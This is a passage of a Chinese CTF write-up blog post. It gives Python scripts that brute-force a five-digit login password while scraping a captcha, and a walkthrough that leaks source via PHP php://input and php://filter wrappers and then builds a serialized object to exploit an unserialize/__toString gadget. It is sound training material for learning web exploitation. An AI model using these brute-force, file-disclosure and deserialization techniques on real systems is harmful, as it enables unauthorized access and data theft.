<span class="keyword">in</span> open(<span class="string">"m.txt"</span>, <span class="string">"r"</span>).readlines()]</div><div class="line"><span class="comment">#m.txt是我生成的00000到99999的字典，自己生成或者改名</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> passwd:</div><div class="line">    UA = random.choice(user_agent_list)  <span class="comment">#随机ua</span></div><div class="line">    headers = &#123;<span class="string">'User-Agent'</span>: UA&#125;  <span class="comment">#构造成一个完整的User-Agent</span></div><div class="line">    r =requests.get(url,headers=headers,cookies=cookies)</div><div class="line">    code = re.findall(<span class="string">r".*?&lt;br&gt;&lt;br&gt;(.*?)&lt;br&gt;&lt;br&gt;"</span>,r.text)[<span class="number">0</span>]</div><div class="line">    payloadurl= <span class="string">"http://ctf1.shiyanbar.com/shian-s/index.php?username=admin&amp;password=%s&amp;randcode=%s"</span>%(i,code)</div><div class="line">    <span class="comment">#print(payloadurl)</span></div><div class="line">    data = requests.get(payloadurl,headers=headers,cookies=cookies)</div><div class="line">    data.encoding=<span class="string">'utf-8'</span></div><div class="line">    <span class="comment"># print(data.text)</span></div><div class="line">    print(i)</div><div class="line">    data = data.text+<span class="string">"---------------%s"</span>%i</div><div class="line">    logfile(data,<span class="string">"data.txt"</span>)</div></pre></td></tr></table></figure></p>
+<p>我的脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># encoding: utf-8</span></div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">@author: iSky0t</span></div><div class="line"><span class="string">@contact: isky0toor@gmail.com</span></div><div class="line"><span class="string">@time: 2017/10/8 11:28</span></div><div class="line"><span class="string">"""</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">99999</span>):</div><div class="line">        s = requests.session()</div><div class="line">        url = <span class="string">"http://ctf1.shiyanbar.com/shian-s/"</span></div><div class="line">        <span class="comment">#req = urllib2.Request(url)</span></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            f = s.get(url).text</div><div class="line">            num = re.findall(<span class="string">'&lt;br&gt;&lt;br&gt;(\d*)&lt;br&gt;&lt;br&gt;'</span>, f)</div><div class="line">            url = url + <span class="string">"?username=admin&amp;password="</span> + str(i).zfill(<span class="number">5</span>) + <span class="string">"&amp;randcode="</span> + num[<span class="number">0</span>]</div><div class="line">            result = s.get(url)</div><div class="line">            result.encoding = <span class="string">'utf-8'</span></div><div class="line">            <span class="keyword">if</span> (<span class="string">'密码错误'</span>.decode(<span class="string">'utf-8'</span>)) <span class="keyword">in</span> result.text:</div><div class="line">                <span class="keyword">print</span> <span class="string">"current num:"</span> + str(i).zfill(<span class="number">5</span>) + <span class="string">" --- "</span> + <span class="string">"password error"</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">print</span> <span class="string">"current num:"</span> + str(i).zfill(<span class="number">5</span>) + <span class="string">"----"</span> + result.text</div><div class="line">                exit()</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">continue</span></div><div class="line">    </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">pass</span></div></pre></td></tr></table></figure></p>
+<p>学习到了个格式化函数，以后再写字典爆破时，不会这样了</p>
+<blockquote>
+<p>str.zfill(width)<br>Return the numeric string left filled with zeros in a string of length width. A sign prefix is handled correctly. The original string is returned if width is less than or equal to len(s).</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">n = <span class="string">"123"</span></div><div class="line">s = n.zfill(<span class="number">5</span>)</div><div class="line"><span class="keyword">assert</span> s == <span class="string">"00123"</span></div><div class="line"></div><div class="line">如果是纯数字</div><div class="line">n = <span class="number">123</span></div><div class="line">s = <span class="string">"%05d"</span> % n</div><div class="line"><span class="keyword">assert</span> s == <span class="string">"00123"</span></div></pre></td></tr></table></figure>
+<h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>这题是学弟找到的有过的原题，我忙完后也看了下，感觉挺有意思的。<br>直接打开显示: <code>you are not admin !</code>，查看源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$user = $_GET[<span class="string">"user"</span>];</div><div class="line">$file = $_GET[<span class="string">"file"</span>];</div><div class="line">$pass = $_GET[<span class="string">"pass"</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is admin"</span>))&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</div><div class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>这边<code>$user</code>的内容用PHP伪协议来达到目的，php的封装协议<code>php://input</code>可以得到原始的post数据，还有<code>$file</code>也利用<code>php://filter</code>分装协议来读取内容，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php://filter/convert.base64-encode/resource=index.php</div></pre></td></tr></table></figure></p>
+<p><img src="/images/shianbei01.png" alt="admin"><br>这边的读取结果是base64加密的，在解密后得到源代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$user = $_GET[<span class="string">"user"</span>];</div><div class="line">$file = $_GET[<span class="string">"file"</span>];</div><div class="line">$pass = $_GET[<span class="string">"pass"</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is admin"</span>))&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</div><div class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/f1a9/"</span>,$file))&#123;</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">include</span>($file); <span class="comment">//class.php</span></div><div class="line">        $pass = unserialize($pass);</div><div class="line">        <span class="keyword">echo</span> $pass;</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line">&lt;!--</div><div class="line">$user = $_GET[<span class="string">"user"</span>];</div><div class="line">$file = $_GET[<span class="string">"file"</span>];</div><div class="line">$pass = $_GET[<span class="string">"pass"</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is admin"</span>))&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</div><div class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>看了源代码，f1a9这个应该是flag文件，那就不能直接读取了，再读取<code>class.php</code>试试<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//f1a9.php</span></div><div class="line">    <span class="keyword">public</span> $file;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</div><div class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="string">"__toString was called!"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>配合刚刚的源码，可以想到用 反序列的方法去读取f1a9.php了，于是本地构造下序列化字符串。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">public</span> $file;  </div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;  </div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </div><div class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);      </div><div class="line">        &#125;  </div><div class="line">        <span class="keyword">return</span> <span class="string">"__toString was called!"</span>;  </div><div class="line">    &#125;  </div><div class="line">&#125;  </div><div class="line"></div><div class="line">$test = <span class="keyword">new</span> Read();</div><div class="line">$test-&gt;file = <span class="string">"php://filter/read=convert.base64-encode/resource=f1a9.php"</span>;</div><div class="line"><span class="keyword">echo</span> serialize($test);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>最后提交得到flag的base64的密文，解密下就行了</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>
+      
+    </div>
+    
+    
+    
+    <div>
+      
+         
+      
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/10/05/mooctest-writeup/" rel="next" title="mooctest-writeup">
+                <i class="fa fa-chevron-left"></i> mooctest-writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zMTE0My83Njky"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          
+            <img class="site-author-image" itemprop="image"
+              src="/uploads/avatar.png"
+              alt="iSky0t" />
+          
+            <p class="site-author-name" itemprop="name">iSky0t</p>
+            <p class="site-description motion-element" itemprop="description">网络信息安全爱好者,大学狗</p>
+        </div>
+
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+            
+              <a href="/archives/">
+            
+                <span class="site-state-item-count">4</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">1</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/iSky0t" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>GitHub</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="mailto:isky0toor@gmail.com" target="_blank" title="E-Mail">
+                  
+                    <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ctf入门级题目"><span class="nav-number">1.</span> <span class="nav-text">ctf入门级题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#曲奇饼"><span class="nav-number">2.</span> <span class="nav-text">曲奇饼</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#类型"><span class="nav-number">3.</span> <span class="nav-text">类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#array-search"><span class="nav-number">3.1.</span> <span class="nav-text">array_search</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#登陆"><span class="nav-number">4.</span> <span class="nav-text">登陆</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#admin"><span class="nav-number">5.</span> <span class="nav-text">admin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">6.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">iSky0t</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.2</div>
+
+
+
+
+        
+
+
+
+
+  <script type="text/javascript">
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//tajs.qq.com/stats?sId=63798059";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("kv5cy3Gfvg24pGeb1xi0W2qq-gzGzoHsz", "tLEuzWC42akUMRw9SgnyPxmt");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
